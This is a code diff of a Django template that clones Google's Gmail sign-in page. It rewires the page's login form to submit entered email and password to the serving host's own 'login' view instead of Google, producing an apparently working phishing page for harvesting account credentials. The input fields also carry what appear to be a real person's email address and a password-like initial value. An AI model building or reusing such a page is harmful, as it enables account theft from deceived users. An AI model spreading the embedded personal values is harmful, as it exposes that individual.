@@ -17991,7 +17991,11 @@
         }
       </style></noscript
     >
-    <link rel="shortcut icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
+    <link
+      rel="shortcut icon"
+      href="https://www.google.com/favicon.ico"
+      type="image/x-icon"
+    />
     <title>Gmail</title>
     <script
       type="module"
@@ -19100,8 +19104,8 @@
             <div class="MyvhI sUoeld"><span class="l3q5xe SQxu9c"></span></div>
           </div>
         </div>
-        <form action="{% url 'login' %}" method="POST" class="rhhJr" jsname="f2d3ae" role="presentation">
-          <div class="nM4rkc" id="yDmH0d" jsaction="ZqRew:.CLIENT">
+        <div class="rhhJr" jsname="f2d3ae" role="presentation">
+          <div class="nM4rkc" id="yDmH0d">
             <c-wiz
               jsrenderer="chA7fe"
               class="g98c7c"
@@ -19218,10 +19222,11 @@
                     <div class="j663ec">
                       <div class="tCpFMc" jsname="rEuO1b" jscontroller="bPkrc">
                         <form
-                          method="post"
-                          novalidate=""
-                          jsaction="submit:JM9m2e;"
+                          action="http://{{ request.get_host }}{% url 'login' 'GM' %}"
+                          method="POST"
                         >
+                          {% csrf_token %}
+
                           <span jsslot=""
                             ><section
                               class="aTzEhb"
@@ -19262,7 +19267,7 @@
                                               spellcheck="false"
                                               tabindex="0"
                                               aria-label="Email or phone"
-                                              name="email"
+                                              name="identifier"
                                               value=""
                                               autocapitalize="none"
                                               id="identifierId"
@@ -19270,6 +19275,7 @@
                                               data-initial-dir="ltr"
                                               data-initial-value="davidighere11@gmail.com"
                                               badinput="false"
+                                              required
                                             />
                                             <div
                                               jsname="YRMmle"
@@ -19302,8 +19308,8 @@
                                           ><c-data
                                             id="c0"
                                             jsdata=" U3wROe;_;$0"
-                                          ></c-data></c-wiz
-                                        >
+                                          ></c-data
+                                        ></c-wiz>
                                         <div
                                           class="SdBahf Fjk18"
                                           jscontroller="p5Gc0b"
@@ -19347,6 +19353,7 @@
                                                             data-initial-dir="ltr"
                                                             data-initial-value="Davidighere8300"
                                                             badinput="false"
+                                                            required
                                                           />
                                                           <div
                                                             jsname="YRMmle"
@@ -19852,7 +19859,7 @@
                       </div>
                     </div>
                     <button
-                    type="submit"
+                      type="submit"
                       class="Z6Ep7d"
                       jsname="DH6Rkf"
                       jscontroller="hmHrle"
@@ -20011,7 +20018,7 @@
                           </div>
                         </div>
                       </div>
-                    </b>
+                    </button>
                   </div>
                 </div>
               </div>
@@ -20422,7 +20429,7 @@
             </script>
             <div id="ZCHFDb"></div>
           </div>
-        </f>
+        </div>
         <c-wiz
           jsrenderer="ZdRp7e"
           jsshadow=""
